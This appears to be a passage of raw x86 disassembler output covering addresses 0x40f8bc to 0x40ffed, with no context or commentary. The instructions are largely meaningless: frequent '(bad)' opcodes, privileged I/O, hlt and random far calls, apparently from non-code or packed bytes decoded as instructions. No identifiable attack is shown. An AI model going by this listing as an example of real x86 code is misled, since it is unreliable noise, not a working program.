  40f8bc:	sub    DWORD PTR [edx-0x1],ecx
  40f8bf:	xchg   esp,eax
  40f8c0:	ja     0x40f915
  40f8c2:	pop    ss
  40f8c3:	inc    ebx
  40f8c4:	mov    bh,BYTE PTR [edi-0x57eafba2]
  40f8ca:	cmp    edi,DWORD PTR [edx-0x3e6cbb02]
  40f8d0:	jl     0x40f86c
  40f8d2:	test   BYTE PTR [eax-0x21],ch
  40f8d5:	fisttp DWORD PTR [esi]
  40f8d7:	out    dx,al
  40f8d8:	leave  
  40f8d9:	mov    ebx,0x2d8a8170
  40f8de:	sub    al,0xad
  40f8e0:	xchg   ecx,eax
  40f8e1:	hlt    
  40f8e2:	(bad)  
  40f8e3:	or     al,0x27
  40f8e5:	mov    cl,0xc6
  40f8e7:	mul    bh
  40f8e9:	loop   0x40f8c2
  40f8eb:	call   0x3ddf:0xd49e8159
  40f8f2:	call   0x9b77:0xddac619d
  40f8f9:	xor    al,ah
  40f8fb:	fwait
  40f8fc:	cs xchg edx,eax
  40f8fe:	mov    dl,0x25
  40f900:	adc    DWORD PTR [ecx],0x69
  40f903:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f904:	sti    
  40f905:	add    al,0xc8
  40f907:	push   ebx
  40f908:	test   eax,0x8e6c6654
  40f90d:	xor    dh,BYTE PTR [ecx]
  40f90f:	cmp    ebx,DWORD PTR [eax]
  40f911:	jne    0x40f912
  40f913:	jle    0x40f8d7
  40f915:	or     DWORD PTR [esi],ecx
  40f917:	sbb    DWORD PTR [edi],edx
  40f919:	push   ss
  40f91a:	or     DWORD PTR [ecx+0x57],edi
  40f91d:	jp     0x40f90b
  40f91f:	cmp    ecx,DWORD PTR [edx-0x43ecca0c]
  40f925:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f926:	lahf   
  40f927:	mov    bh,0x1c
  40f929:	(bad)  
  40f92a:	lock or eax,0x79341d6a
  40f930:	adc    esi,DWORD PTR [esi]
  40f932:	enter  0xc453,0xe9
  40f936:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  40f938:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f939:	test   BYTE PTR [edi+0x31f9c19f],dh
  40f93f:	addr16 xchg edi,eax
  40f941:	loope  0x40f9b8
  40f943:	retf   
  40f944:	xchg   ecx,eax
  40f945:	je     0x40f91f
  40f947:	scas   al,BYTE PTR es:[edi]
  40f948:	push   cs
  40f949:	out    0x40,eax
  40f94b:	mov    es,WORD PTR [edx-0x2a618b26]
  40f951:	mov    dl,0xa2
  40f953:	push   ecx
  40f954:	gs pop ebx
  40f956:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f957:	fs je  0x40f956
  40f95a:	(bad)
  40f95e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f95f:	and    DWORD PTR [edx+ebx*1],eax
  40f962:	push   esi
  40f963:	rcl    BYTE PTR [esi+esi*2-0x193bcd5b],1
  40f96a:	jb     0x40f8f0
  40f96c:	cld    
  40f96d:	mov    ebp,0x679da2c1
  40f972:	(bad)  
  40f973:	cmp    edi,esi
  40f975:	(bad)  
  40f976:	in     al,0x8d
  40f978:	push   edi
  40f979:	add    edx,DWORD PTR [ecx+0x7d]
  40f97c:	jmp    0x40f945
  40f97e:	enter  0xcdcd,0xbd
  40f982:	xor    eax,0x5821b7e9
  40f987:	and    esi,DWORD PTR [eax]
  40f989:	inc    edi
  40f98a:	mov    dh,0xd3
  40f98c:	shl    BYTE PTR [edx+0x14],0x88
  40f990:	pop    ecx
  40f991:	fdiv   DWORD PTR [esi-0x6f]
  40f994:	call   0x7d7e1aaa
  40f999:	xchg   edx,eax
  40f99a:	div    BYTE PTR [ecx]
  40f99c:	push   ds
  40f99d:	cmp    al,0x2f
  40f99f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f9a0:	add    al,0xb9
  40f9a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f9a3:	icebp  
  40f9a4:	addr16 sbb bl,al
  40f9a7:	mov    ah,0x10
  40f9a9:	in     al,dx
  40f9aa:	es push 0x43
  40f9ad:	out    0xdd,al
  40f9af:	mov    al,al
  40f9b1:	sti    
  40f9b2:	pop    ebx
  40f9b3:	xchg   edx,eax
  40f9b4:	push   eax
  40f9b5:	and    eax,0xa787c274
  40f9ba:	aad    0xae
  40f9bc:	dec    edx
  40f9bd:	mov    bl,0x13
  40f9bf:	mov    eax,0x81bb6c1d
  40f9c4:	mov    al,ds:0x69e075f
  40f9c9:	into   
  40f9ca:	pop    ss
  40f9cb:	or     edx,DWORD PTR [ebx-0x2dec8fcf]
  40f9d1:	int    0xc0
  40f9d3:	push   edx
  40f9d4:	rcl    edi,1
  40f9d6:	mov    dh,0x41
  40f9d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f9d9:	(bad)  
  40f9da:	dec    ecx
  40f9db:	inc    edi
  40f9dc:	daa    
  40f9dd:	fs inc ebp
  40f9df:	iret   
  40f9e0:	dec    edi
  40f9e1:	loop   0x40f9da
  40f9e3:	test   DWORD PTR [ebp-0xf],edi
  40f9e6:	in     al,0x1d
  40f9e8:	test   eax,0x91a1a284
  40f9ed:	jno    0x40fa2e
  40f9ef:	cld    
  40f9f0:	pusha  
  40f9f1:	(bad)  
  40f9f2:	cld    
  40f9f3:	dec    eax
  40f9f4:	adc    edx,esi
  40f9f6:	add    esp,esi
  40f9f8:	jmp    0x40fa3c
  40f9fa:	cmc    
  40f9fb:	(bad)  
  40f9fc:	ins    BYTE PTR es:[edi],dx
  40f9fd:	shr    BYTE PTR [ebx],0x64
  40fa00:	jnp    0x40fa32
  40fa02:	cmc    
  40fa03:	test   BYTE PTR [ebp+ecx*2+0x73],ah
  40fa07:	sbb    dh,dl
  40fa09:	mov    al,0x81
  40fa0b:	mov    ah,0x31
  40fa0d:	and    al,0xaa
  40fa0f:	xchg   ecx,eax
  40fa10:	inc    esp
  40fa11:	sbb    DWORD PTR [esi-0x37],0x2f847836
  40fa18:	lea    eax,[eax]
  40fa1a:	sbb    DWORD PTR [ebx-0x352bc2e8],0xb490305a
  40fa24:	sti    
  40fa25:	or     esi,DWORD PTR [esi-0x69]
  40fa28:	mov    dl,0x9d
  40fa2a:	loopne 0x40f9af
  40fa2c:	es push cs
  40fa2e:	ss aad 0x78
  40fa31:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fa32:	dec    edi
  40fa33:	shl    DWORD PTR ds:0xed39b413,0x1d
  40fa3a:	out    dx,eax
  40fa3b:	and    cl,BYTE PTR [eax+0x2131ae2e]
  40fa41:	sbb    edi,edx
  40fa43:	dec    esp
  40fa44:	jge    0x40fa95
  40fa46:	pop    dx
  40fa48:	pop    ss
  40fa49:	leave  
  40fa4a:	lea    eax,[ecx+0x51]
  40fa4d:	pop    edi
  40fa4e:	ins    DWORD PTR es:[edi],dx
  40fa4f:	jne    0x40fa0d
  40fa51:	pop    edx
  40fa52:	loopne 0x40fa87
  40fa54:	fwait
  40fa55:	inc    ebp
  40fa56:	add    DWORD PTR [ecx-0x6908d2f1],edx
  40fa5c:	jmp    0x40f9f6
  40fa5e:	ins    DWORD PTR es:[edi],dx
  40fa5f:	ret    0x1be8
  40fa62:	jne    0x40fa28
  40fa64:	add    BYTE PTR [edx-0x6d7d3ab9],cl
  40fa6a:	mov    al,0x99
  40fa6c:	jns    0x40fa0d
  40fa6e:	iret   
  40fa6f:	inc    ebp
  40fa70:	push   ebp
  40fa71:	mov    al,0x1c
  40fa73:	mov    ebx,0x1d5986b4
  40fa78:	dec    ebx
  40fa79:	sub    eax,0x59ac3c7f
  40fa7e:	addr16 jno 0x40fa33
  40fa81:	call   0x754492a9
  40fa86:	and    BYTE PTR [edi],dh
  40fa88:	ins    DWORD PTR es:[edi],dx
  40fa89:	pop    ds
  40fa8a:	xchg   DWORD PTR [edi+0x55],edi
  40fa8d:	inc    eax
  40fa8e:	cmp    eax,0xcbd533a4
  40fa93:	(bad)  
  40fa94:	xchg   esi,eax
  40fa95:	fcomp  st(0)
  40fa97:	fsubrp st(7),st
  40fa99:	cmp    eax,0x327cf506
  40fa9e:	jmp    0x6883569f
  40faa3:	std    
  40faa4:	js     0x40fa8b
  40faa6:	repnz fldenv [ecx-0x5e037952]
  40faad:	push   0xe23a00f1
  40fab2:	std    
  40fab3:	adc    dh,BYTE PTR [edi+0x11f98b7f]
  40fab9:	add    DWORD PTR [esi-0x66],esp
  40fabc:	or     dh,BYTE PTR ds:0xb282b30a
  40fac2:	adc    al,0x19
  40fac4:	stos   DWORD PTR es:[edi],eax
  40fac5:	in     eax,0x67
  40fac7:	pop    esp
  40fac8:	pop    ds
  40fac9:	mov    cl,0x1b
  40facb:	inc    edi
  40facc:	sbb    dh,bl
  40face:	out    0x75,eax
  40fad0:	push   ds
  40fad1:	sbb    dl,BYTE PTR [esi-0x3e336f09]
  40fad7:	stos   BYTE PTR es:[edi],al
  40fad8:	(bad)  
  40fad9:	leave  
  40fada:	in     eax,0xac
  40fadc:	js     0x40fb46
  40fade:	(bad)  
  40fae0:	lea    ecx,[eax-0x577196ee]
  40fae6:	jle    0x40fad2
  40fae8:	fs or  bh,al
  40faeb:	push   ds
  40faec:	xlat   BYTE PTR ds:[ebx]
  40faed:	lods   al,BYTE PTR ds:[esi]
  40faee:	jg     0x40fade
  40faf0:	les    ebp,FWORD PTR [eax-0x5b]
  40faf3:	jne    0x40fb16
  40faf5:	sub    dh,ch
  40faf7:	mov    bl,0x86
  40faf9:	push   ebp
  40fafa:	(bad)  
  40fafb:	cwde   
  40fafc:	mov    bh,0x1b
  40fafe:	dec    esp
  40faff:	fs scas al,BYTE PTR es:[edi]
  40fb01:	movzx  ecx,ah
  40fb04:	push   eax
  40fb05:	pop    ss
  40fb06:	cmp    al,0xda
  40fb08:	adc    eax,DWORD PTR [edx-0x3ad03963]
  40fb0e:	into   
  40fb0f:	sub    eax,DWORD PTR [ebp-0x3397a9c2]
  40fb15:	icebp  
  40fb16:	sub    ch,BYTE PTR [esi+0x13]
  40fb19:	mov    BYTE PTR [ebp+0x5d3f2560],dl
  40fb1f:	cmp    ebx,DWORD PTR [esp+ebp*1+0x10]
  40fb23:	shr    ch,0x3c
  40fb26:	xor    eax,0x8de472e3
  40fb2b:	push   es
  40fb2c:	adc    eax,0x10e088b9
  40fb31:	sub    DWORD PTR [edi],ebp
  40fb33:	inc    ecx
  40fb34:	mov    eax,0x5121ca8c
  40fb39:	popf   
  40fb3a:	dec    eax
  40fb3b:	inc    edi
  40fb3c:	add    DWORD PTR [ebp+0x4e94e155],esp
  40fb42:	or     al,0x7e
  40fb44:	inc    ebp
  40fb45:	xchg   edx,eax
  40fb46:	fdivr  DWORD PTR [ebx+edx*4]
  40fb49:	mov    edi,0xb372e577
  40fb4e:	inc    ecx
  40fb4f:	pop    ds
  40fb50:	ret    0x862e
  40fb53:	pusha  
  40fb54:	repz push 0x6e
  40fb57:	imul   edx,DWORD PTR [ebx],0x7a867c27
  40fb5d:	or     DWORD PTR ds:0x9791eab6,0xf6bade5d
  40fb67:	and    BYTE PTR [edi],ch
  40fb69:	fwait
  40fb6a:	mov    eax,ds:0xc4bea1ca
  40fb6f:	xor    BYTE PTR [esi],0x43
  40fb72:	aad    0x36
  40fb74:	mov    ch,0x7f
  40fb76:	call   0x905b490e
  40fb7b:	mov    dh,0x12
  40fb7d:	test   DWORD PTR [esp+ecx*1-0x17],ebp
  40fb81:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fb82:	mov    bl,0x7e
  40fb84:	in     al,dx
  40fb85:	in     eax,dx
  40fb86:	dec    edx
  40fb87:	enter  0xd5b7,0xae
  40fb8b:	adc    BYTE PTR [ecx+0x6760cad],cl
  40fb91:	xchg   BYTE PTR [eax-0x23],bh
  40fb94:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fb95:	mov    al,0xc3
  40fb97:	shl    cl,0xa8
  40fb9a:	push   ebp
  40fb9b:	pop    ebp
  40fb9c:	mov    ch,BYTE PTR [ecx+0x14]
  40fb9f:	(bad)  
  40fba0:	retf   0x6a11
  40fba3:	loope  0x40fbdf
  40fba5:	lahf   
  40fba6:	push   edi
  40fba7:	or     BYTE PTR [esi+0x6b],ch
  40fbaa:	cli    
  40fbab:	and    ch,bl
  40fbad:	push   ebx
  40fbae:	pop    DWORD PTR [eax+0x6be72c0f]
  40fbb4:	xor    DWORD PTR [ebx-0x1d],edx
  40fbb7:	pop    esp
  40fbb8:	xchg   esp,eax
  40fbb9:	rcl    BYTE PTR [ebp+edx*1-0x1de32b2d],0x87
  40fbc1:	cwde   
  40fbc2:	jle    0x40fc2a
  40fbc4:	jnp    0x40fbd0
  40fbc6:	stos   DWORD PTR es:[edi],eax
  40fbc7:	push   0x27
  40fbc9:	mov    BYTE PTR [ecx+0x4c],0x2a
  40fbcd:	sbb    ebx,DWORD PTR [esp+eax*4+0x4e]
  40fbd1:	inc    ecx
  40fbd2:	jo     0x40fc20
  40fbd4:	mov    ch,0x58
  40fbd6:	push   es
  40fbd7:	ficomp WORD PTR [edi-0x3044f97b]
  40fbdd:	xor    bh,BYTE PTR [ebx-0x2d]
  40fbe0:	mov    ds:0x268b1fc3,eax
  40fbe5:	loop   0x40fbb5
  40fbe7:	push   esi
  40fbe8:	mov    al,0x47
  40fbea:	test   al,0xfc
  40fbec:	(bad)  
  40fbee:	pusha  
  40fbef:	jecxz  0x40fbe0
  40fbf1:	inc    esp
  40fbf2:	iret   
  40fbf3:	(bad)  
  40fbf4:	ja     0x40fbc1
  40fbf6:	js     0x40fc5b
  40fbf8:	cmp    eax,0x6a5a430d
  40fbfd:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fbff:	adc    BYTE PTR ds:0x7a07b5ef,bl
  40fc05:	out    0x60,eax
  40fc07:	dec    edi
  40fc08:	sub    cl,BYTE PTR [ecx]
  40fc0a:	mov    eax,ds:0x396ebabd
  40fc0f:	sahf   
  40fc10:	push   0xfffffffb
  40fc12:	jp     0x40fc01
  40fc14:	push   edx
  40fc15:	or     DWORD PTR [edi+esi*8],ecx
  40fc18:	sub    BYTE PTR [edi+0x32],bh
  40fc1b:	fwait
  40fc1c:	inc    edi
  40fc1d:	(bad)  
  40fc1f:	mov    cl,0x93
  40fc21:	retf   0x1ae
  40fc24:	pop    edi
  40fc25:	jle    0x40fc2c
  40fc27:	sbb    ebx,edx
  40fc29:	out    0x50,eax
  40fc2b:	std    
  40fc2c:	shr    BYTE PTR [edx+edi*4+0x65aa5108],0x61
  40fc34:	retf   0x2bd6
  40fc37:	pop    esi
  40fc38:	fdiv   st,st(3)
  40fc3a:	shl    ecx,cl
  40fc3c:	inc    eax
  40fc3d:	mov    edi,0x3f4fd07b
  40fc42:	jae    0x40fc23
  40fc44:	dec    esp
  40fc45:	inc    ebx
  40fc46:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fc47:	in     al,dx
  40fc48:	mov    ds:0xae647b1c,al
  40fc4d:	mov    eax,0xd379f2ce
  40fc52:	xchg   edx,eax
  40fc53:	int    0x6d
  40fc55:	in     eax,dx
  40fc56:	mov    bh,0x5c
  40fc58:	mov    ?,WORD PTR [esi+0x18e32efc]
  40fc5e:	sbb    eax,0x2acc310e
  40fc63:	jo     0x40fcc4
  40fc65:	jmp    0x47d4a981
  40fc6a:	mov    ebx,0xe0e2d225
  40fc6f:	and    BYTE PTR [ecx+0x6e],al
  40fc72:	mov    cl,0xb4
  40fc74:	int3   
  40fc75:	push   cs
  40fc76:	dec    eax
  40fc77:	repnz xor dh,al
  40fc7a:	leave  
  40fc7b:	sub    BYTE PTR [ebp+0x43],ch
  40fc7e:	cmp    eax,0x68aa619
  40fc83:	xchg   ecx,eax
  40fc84:	std    
  40fc85:	add    esp,ebx
  40fc87:	push   edi
  40fc88:	pop    esi
  40fc89:	test   al,0x2c
  40fc8b:	cmp    al,BYTE PTR [ebx+esi*1-0x3f]
  40fc8f:	mov    al,ds:0x20d5ce95
  40fc94:	int    0x39
  40fc96:	outs   dx,BYTE PTR ds:[esi]
  40fc97:	and    edi,DWORD PTR [edx+0x0]
  40fc9a:	inc    esp
  40fc9b:	cmp    DWORD PTR [edx+ebp*1-0x5c0a7780],ebx
  40fca2:	loopne 0x40fd1a
  40fca4:	jae    0x40fc6a
  40fca6:	inc    esp
  40fca7:	test   al,0xe4
  40fca9:	sbb    DWORD PTR [edx],esp
  40fcab:	and    DWORD PTR [eax],esp
  40fcad:	push   cs
  40fcae:	pop    ecx
  40fcaf:	cmp    eax,0xfa8ffb92
  40fcb4:	mov    bl,0xa7
  40fcb6:	adc    BYTE PTR [edi+0x1b],dh
  40fcb9:	call   0x4d24f5a5
  40fcbe:	pop    esp
  40fcbf:	mov    ds:0x9f8b21ae,al
  40fcc4:	mov    cl,0xc2
  40fcc6:	pop    es
  40fcc7:	test   eax,0x71444b39
  40fccc:	cmp    eax,DWORD PTR [ebx+0x6520ef5e]
  40fcd2:	(bad)  
  40fcd3:	not    BYTE PTR [ebp+0x2ebd0447]
  40fcd9:	lods   eax,DWORD PTR ds:[esi]
  40fcda:	inc    ebx
  40fcdb:	popa   
  40fcdc:	in     eax,0x66
  40fcde:	repz jo 0x40fcea
  40fce1:	out    dx,al
  40fce2:	arpl   WORD PTR [eax],bx
  40fce4:	gs adc al,0xe1
  40fce7:	pop    ss
  40fce8:	(bad)  
  40fce9:	enter  0xa9bc,0x1d
  40fced:	fcomp  QWORD PTR [ebp-0x5d]
  40fcf0:	pop    esp
  40fcf1:	int    0x1
  40fcf3:	(bad)  
  40fcf4:	aad    0x65
  40fcf6:	loope  0x40fc87
  40fcf8:	mov    eax,0xe7f33634
  40fcfd:	mov    eax,esp
  40fcff:	push   ebx
  40fd00:	dec    esp
  40fd01:	jge    0x40fcb5
  40fd03:	mov    ds:0xb45054d4,al
  40fd08:	mov    edi,DWORD PTR [ebx+0x76]
  40fd0b:	or     al,BYTE PTR [esi+0x43]
  40fd0e:	data16 and dl,BYTE PTR [esi]
  40fd11:	shl    BYTE PTR ds:[ebx+0x867a9eb],0xdc
  40fd19:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fd1a:	cmp    ch,ch
  40fd1c:	inc    esi
  40fd1d:	pushf  
  40fd1e:	outs   dx,DWORD PTR ds:[esi]
  40fd1f:	call   0x50a8:0x43a5a7f2
  40fd26:	pop    ds
  40fd27:	shl    ebp,cl
  40fd29:	loopne 0x40fd77
  40fd2b:	sub    bl,0x43
  40fd2e:	retf   
  40fd2f:	inc    ecx
  40fd30:	bound  ebp,QWORD PTR [edx+0x1a]
  40fd33:	fisttp DWORD PTR [edi+ebx*4+0x5b]
  40fd37:	scas   eax,DWORD PTR es:[edi]
  40fd38:	stos   BYTE PTR es:[edi],al
  40fd39:	adc    eax,DWORD PTR [edx]
  40fd3b:	icebp  
  40fd3c:	popf   
  40fd3d:	xchg   ebx,eax
  40fd3e:	xchg   edx,eax
  40fd3f:	js     0x40fd2f
  40fd41:	add    edx,ebx
  40fd43:	popa   
  40fd44:	fcom   DWORD PTR [eax-0x41]
  40fd47:	iret   
  40fd48:	imul   ebp,esi,0x45732cb4
  40fd4e:	ret    0xebf5
  40fd51:	(bad)  
  40fd52:	cmp    ebx,DWORD PTR [esp+esi*8+0x6a8c883c]
  40fd59:	ror    BYTE PTR [eax+0x13],cl
  40fd5c:	pop    edx
  40fd5d:	aam    0xdb
  40fd5f:	adc    eax,0xe6003458
  40fd64:	mov    ch,0x91
  40fd66:	(bad)  [ebx+0x73]
  40fd69:	jmp    DWORD PTR ds:0xceaf1a9
  40fd6f:	out    dx,eax
  40fd70:	and    al,0x2
  40fd72:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fd73:	fnstsw WORD PTR [edx+0x73]
  40fd76:	and    eax,0xd9bee138
  40fd7b:	jmp    0x4413:0xa003ffb1
  40fd82:	mov    ah,0x6c
  40fd84:	(bad)  
  40fd85:	push   esi
  40fd86:	mov    ebx,DWORD PTR [esi]
  40fd88:	lds    esi,FWORD PTR [edi-0x79]
  40fd8b:	push   ebx
  40fd8c:	add    al,0x11
  40fd8e:	addr16 call 0x613b:0xc2e5b78c
  40fd96:	xor    eax,esp
  40fd98:	jbe    0x40fddf
  40fd9a:	mov    edx,0x7dae8943
  40fd9f:	xchg   ebx,eax
  40fda0:	pop    esp
  40fda1:	fcmove st,st(4)
  40fda3:	div    DWORD PTR ss:[eax-0x4338908a]
  40fdaa:	inc    ebp
  40fdab:	mov    eax,0x93d9d513
  40fdb0:	ror    DWORD PTR [edx+edx*1],1
  40fdb3:	push   ds
  40fdb4:	iret   
  40fdb5:	loop   0x40fda6
  40fdb7:	sub    esp,ebx
  40fdb9:	pop    edx
  40fdba:	clc    
  40fdbb:	not    BYTE PTR [ebx]
  40fdbd:	mov    edi,0x8c5d571d
  40fdc2:	in     eax,0x35
  40fdc4:	pop    ebx
  40fdc5:	sbb    ebp,ebp
  40fdc7:	sub    eax,0x6717f960
  40fdcc:	aad    0x8c
  40fdce:	loopne 0x40fdcb
  40fdd0:	call   0xe97:0x2d488194
  40fdd7:	pop    ds
  40fdd8:	shl    DWORD PTR [esi+0x7af1ecd3],1
  40fdde:	sbb    al,0xd4
  40fde0:	or     eax,0x7f76cc9c
  40fde5:	or     al,0x7
  40fde7:	dec    ebp
  40fde8:	add    BYTE PTR [edi-0x7ad64c41],bh
  40fdee:	pop    esp
  40fdef:	(bad)  
  40fdf0:	pop    edx
  40fdf1:	add    eax,0xf00e61b5
  40fdf6:	retf   
  40fdf7:	lds    ecx,FWORD PTR [edi]
  40fdf9:	push   ss
  40fdfa:	dec    ecx
  40fdfb:	mov    cl,0xbc
  40fdfd:	inc    esi
  40fdfe:	data16 scas al,BYTE PTR es:[edi]
  40fe00:	jmp    0x2a4f324e
  40fe05:	in     eax,dx
  40fe06:	nop
  40fe07:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fe08:	cli    
  40fe09:	jle    0x40fdc4
  40fe0b:	sub    BYTE PTR [ecx+esi*4+0xba326ee],al
  40fe12:	add    BYTE PTR [edx+0x68f7d495],cl
  40fe18:	fstp   QWORD PTR [esi-0x30]
  40fe1b:	push   ecx
  40fe1c:	xchg   ecx,eax
  40fe1d:	mov    dh,0x2a
  40fe1f:	mov    esi,0xd919fe20
  40fe24:	push   0x21
  40fe26:	cmc    
  40fe27:	bswap  ecx
  40fe29:	push   0xcece0e63
  40fe2e:	shr    BYTE PTR [esi+ecx*2],1
  40fe31:	push   cs
  40fe32:	loopne 0x40fe21
  40fe34:	out    dx,eax
  40fe35:	cmp    ah,ch
  40fe37:	cmp    edi,DWORD PTR [esi-0x36]
  40fe3a:	xor    edx,DWORD PTR [eax-0x78]
  40fe3d:	xchg   ebp,eax
  40fe3e:	bswap  esi
  40fe40:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fe41:	repnz xchg ebx,eax
  40fe43:	cmp    eax,0x9734e1ff
  40fe48:	test   BYTE PTR [eax+0x42ca68a2],bh
  40fe4e:	cmp    DWORD PTR [edi],esp
  40fe50:	in     eax,dx
  40fe51:	out    dx,al
  40fe52:	scas   al,BYTE PTR es:[edi]
  40fe53:	mov    WORD PTR ds:0xd6418c72,fs
  40fe59:	jge    0x40fe23
  40fe5b:	xchg   edi,eax
  40fe5c:	(bad)  
  40fe5d:	(bad)  
  40fe5e:	leave  
  40fe5f:	mov    bh,0x7f
  40fe61:	add    ch,BYTE PTR [ebp-0x4831e28f]
  40fe67:	jno    0x40fe3a
  40fe69:	es dec esp
  40fe6b:	fsubr  QWORD PTR [edi+0x3554f28]
  40fe71:	add    ebx,DWORD PTR [esi]
  40fe73:	leave  
  40fe74:	(bad)  
  40fe75:	in     al,0x66
  40fe77:	mov    dh,0xb8
  40fe79:	mov    esi,0x519751f4
  40fe7e:	push   0x7d99e964
  40fe83:	fwait
  40fe84:	scas   eax,DWORD PTR es:[edi]
  40fe85:	std    
  40fe86:	popf   
  40fe87:	jecxz  0x40fe2f
  40fe89:	xchg   esp,eax
  40fe8a:	or     al,BYTE PTR [edi]
  40fe8c:	daa    
  40fe8d:	int3   
  40fe8e:	or     edi,ebx
  40fe90:	aas    
  40fe91:	jns    0x40fe53
  40fe93:	out    dx,eax
  40fe94:	jae    0x40fee9
  40fe96:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fe97:	test   eax,0xdbad8652
  40fe9c:	ja     0x40feb5
  40fe9e:	and    bh,bh
  40fea0:	sub    bh,BYTE PTR [edx]
  40fea2:	xor    bh,ch
  40fea4:	and    al,bl
  40fea6:	jb     0x40fe89
  40fea8:	mov    ds:0xfd71f101,eax
  40fead:	out    0x38,al
  40feaf:	push   ebp
  40feb0:	vunpcklps xmm2,xmm2,XMMWORD PTR [ebx+0x64787ca3]
  40feb8:	fisub  WORD PTR [esi+0x28]
  40febb:	daa    
  40febc:	int3   
  40febd:	mov    ch,0x41
  40febf:	push   edi
  40fec0:	jmp    0x8ceba19a
  40fec5:	pop    ebx
  40fec6:	mov    WORD PTR [ecx],ds
  40fec8:	xchg   DWORD PTR [ebx-0xbc90dbe],ebx
  40fece:	in     al,dx
  40fecf:	leave  
  40fed0:	push   0xb10bcdd8
  40fed5:	jb     0x40ff09
  40fed7:	punpckhwd mm7,QWORD PTR [ebx+ebx*2+0x47ef0c1f]
  40fedf:	ror    BYTE PTR [eax],0xc4
  40fee2:	mov    ?,WORD PTR [edi]
  40fee4:	add    eax,esi
  40fee6:	ins    BYTE PTR es:[edi],dx
  40fee7:	bound  ebp,QWORD PTR [edi-0x7]
  40feea:	and    eax,ebx
  40feec:	std    
  40feed:	(bad)  
  40feee:	ror    al,0x68
  40fef1:	loop   0x40ff41
  40fef3:	popf   
  40fef4:	fadd   QWORD PTR [edi+0x75]
  40fef7:	adc    al,BYTE PTR [ebx]
  40fef9:	push   ds
  40fefa:	jp     0x40fe97
  40fefc:	push   0x79957388
  40ff01:	jae    0x40ff63
  40ff03:	mov    dl,0x36
  40ff05:	xrelease mov DWORD PTR [edi-0x2f],0x27b5e46e
  40ff0d:	sar    BYTE PTR [edx],1
  40ff0f:	out    dx,eax
  40ff10:	test   DWORD PTR [esp+ecx*8],ebx
  40ff13:	dec    ebx
  40ff14:	mov    BYTE PTR [esi+0x4711c781],dl
  40ff1a:	int3   
  40ff1b:	aaa    
  40ff1c:	inc    edi
  40ff1d:	ficom  DWORD PTR [ebx+ebx*1]
  40ff20:	stos   DWORD PTR es:[edi],eax
  40ff21:	loopne 0x40fed4
  40ff23:	call   0x4cf2:0xbfff1d5c
  40ff2a:	bound  di,DWORD PTR [ecx-0x7a3b128f]
  40ff31:	ret    
  40ff32:	stos   BYTE PTR es:[edi],al
  40ff33:	jo     0x40ff5d
  40ff35:	cmp    esi,DWORD PTR [eax-0x41e2ca3a]
  40ff3b:	mov    ds:0xbde60c75,al
  40ff40:	retf   
  40ff41:	mov    bl,0x69
  40ff43:	xchg   edx,eax
  40ff44:	push   ds
  40ff45:	adc    eax,0x76808100
  40ff4a:	pusha  
  40ff4b:	mov    bh,ah
  40ff4d:	dec    ebx
  40ff4e:	dec    esi
  40ff4f:	xor    cl,bl
  40ff51:	push   ss
  40ff52:	out    dx,eax
  40ff53:	pop    ecx
  40ff54:	fs stos BYTE PTR es:[edi],al
  40ff56:	sbb    ch,ah
  40ff58:	pop    es
  40ff59:	mov    ds:0xbcf092bc,al
  40ff5e:	(bad)  
  40ff5f:	adc    DWORD PTR [ecx+0x59e0062c],eax
  40ff65:	push   esi
  40ff66:	sub    al,0x71
  40ff68:	sar    ecx,0xa1
  40ff6b:	mov    al,0xe8
  40ff6d:	outs   dx,BYTE PTR ds:[esi]
  40ff6e:	rcr    DWORD PTR [ebp+ebp*1+0x44499468],cl
  40ff75:	cmc    
  40ff76:	loopne 0x40ff05
  40ff78:	(bad)  
  40ff79:	mov    bh,0x45
  40ff7b:	sbb    eax,0xc0339092
  40ff80:	out    dx,eax
  40ff81:	in     al,dx
  40ff82:	push   ecx
  40ff84:	mov    esi,ecx
  40ff86:	sbb    eax,0xbcb4cc6a
  40ff8b:	or     al,0xb
  40ff8d:	enter  0x2380,0xff
  40ff91:	lods   eax,DWORD PTR ds:[esi]
  40ff92:	or     dl,BYTE PTR [edi]
  40ff94:	test   al,0x48
  40ff96:	out    dx,al
  40ff97:	in     al,dx
  40ff98:	and    dl,BYTE PTR [ecx]
  40ff9a:	xor    BYTE PTR [eax-0x4b],cl
  40ff9d:	or     dh,ch
  40ff9f:	or     DWORD PTR [ecx+0x7e146b96],eax
  40ffa5:	cmp    bl,BYTE PTR [ecx+0x2c]
  40ffa8:	inc    esp
  40ffa9:	arpl   WORD PTR [ecx-0x50ed5f1c],ax
  40ffaf:	imul   edi,DWORD PTR [ebp+0x792db5d8],0x12
  40ffb6:	sbb    ebp,DWORD PTR [edi+0x4980269d]
  40ffbc:	sub    al,0x63
  40ffbe:	or     ebx,DWORD PTR ds:0x544885b7
  40ffc4:	(bad)  
  40ffc5:	out    dx,eax
  40ffc6:	xor    eax,0xb9a379d
  40ffcb:	fldenv [ebp-0x462cf0f]
  40ffd1:	mov    ds:0xcf9eaf5f,al
  40ffd6:	sbb    BYTE PTR ds:0x1e7dcfbe,ch
  40ffdc:	lahf   
  40ffdd:	shl    BYTE PTR [eax+ebp*8],1
  40ffe0:	(bad)  
  40ffe1:	repnz add al,0x21
  40ffe4:	and    esi,0xffffffd9
  40ffe7:	or     esi,DWORD PTR [ecx-0x602d2d48]
  40ffed:	and    al,BYTE PTR [esp+eiz*2]
